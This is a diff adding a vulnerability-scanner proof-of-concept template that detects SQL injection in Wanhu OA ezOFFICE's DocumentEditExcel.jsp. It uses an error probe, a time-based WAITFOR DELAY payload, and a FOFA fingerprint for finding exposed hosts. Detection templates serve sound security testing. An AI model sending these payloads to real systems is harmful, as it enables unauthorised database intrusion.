@@ -1,0 +1,27 @@
+id: poc-yaml-whir-oa-documenteditexcel-sqli
+info:
+  name: 万户OA DocumentEditExcel SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 万户OA ezoffice
+  fofa: app="万户网络-ezOFFICE"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /defaultroot/public/iWebOfficeSign/DocumentEditExcel.jsp;?RecordID=1'
+  expression: status_code == 500 && contains(body,"java.lang.NullPointerException")
+- method: GET
+  path: /defaultroot/public/iWebOfficeSign/DocumentEditExcel.jsp;?RecordID=1'%3b+WAITFOR%20DELAY%20%270:0:{{.t1}}%27--
+  expression: 'status_code == 200 &&
+
+    contains(title,"iWebOfficeSign") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
